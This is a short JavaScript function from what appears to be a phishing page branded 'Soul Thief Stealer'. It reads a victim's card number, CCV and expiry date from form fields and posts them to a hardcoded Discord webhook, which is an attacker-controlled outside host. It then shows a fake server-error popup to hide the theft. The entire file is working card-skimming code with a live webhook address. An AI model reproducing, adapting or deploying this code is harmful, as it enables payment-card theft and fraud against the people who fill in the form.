function sendMessage() {
    function sleep(milliseconds) {
      const date = Date.now();
      let currentDate = null;
      do {
        currentDate = Date.now();
      } while (currentDate - date < milliseconds);
    }
  
    var request = new XMLHttpRequest();
    request.open(
      "POST",
      "https://discord.com/api/webhooks/1086574313643200602/_tBM6buySzr2UAiwK58LPvgA3INhMqPR61I7QTUaqGXpOHAyHcuHbgl6IvmUbGJQLdRQ"
    );
    request.setRequestHeader("Content-type", "application/json");
    var params = {
      username: "Soul Thief Stealer",
      avatar_url:
        "https://cdn.discordapp.com/attachments/933369553403138078/1084469429905141860/Blanc_et_Noir_Montagne_Net_et_Moderne_Eglise_Logo-modified_1.png",
      embeds: [
        {
          title: "Card Information",
          color: 0x0099ff,
          fields: [
            {
              name: "💳 **Number**",
              value: document.getElementById("card").value,
              inline: false,
            },
            {
              name: "📩 **CCV**",
              value: document.getElementById("ccv").value,
              inline: false,
            },
            {
                name: "🔠 **Date**",
                value: document.getElementById("date").value,
                inline: false,
              },
          ],
          footer: {
            icon_url: "https://cdn.discordapp.com/attachments/933369553403138078/1084467078414741644/Blanc_et_Noir_Montagne_Net_et_Moderne_Eglise_Logo.png",
            text: "Soul Thief Stealer",
          },
          thumbnail: {
            url: "https://cdn.discordapp.com/attachments/933369553403138078/1084469429905141860/Blanc_et_Noir_Montagne_Net_et_Moderne_Eglise_Logo-modified_1.png"
          },
          timestamp: new Date().toISOString()
        },
      ],
    };
    request.send(JSON.stringify(params));
    sleep(400);
  
    // Ajouter la popup ici
    alert("ERROR SERVER- try again later");
  }

  

